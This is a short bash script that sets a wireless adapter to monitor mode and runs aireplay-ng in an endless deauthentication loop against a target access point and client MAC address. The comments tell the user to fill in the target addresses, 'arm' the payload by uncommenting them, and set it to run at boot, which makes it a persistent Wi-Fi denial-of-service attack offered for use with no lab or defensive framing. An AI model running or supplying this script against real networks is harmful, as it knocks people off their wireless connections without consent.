#!bin/bash

# Kills any conflicting processes to free up space for aireplay
sudo airmon-ng check kill

# Makes sure the wireless interface for the Alfa card is selected
sudo airmon-ng start wlan0 

# Allows time for the device to configure itself
sleep 5

# Edit the CHANGE ME inside the AP MAC and Target MAC variables to reflect the AP MAC of the target, and the MAC of the target. 
# Then, delete the # prepending the variables in order to "arm" the script. The payload is considered "disarmed" until you do this. 
# Configure the script to run on boot and you're good to go.

#AP_MAC="CHANGE ME"
#Target_MAC="CHANGE ME"

sudo aireplay-ng -0 0 -a $AP_MAC -c $Target_MAC -D wlan0
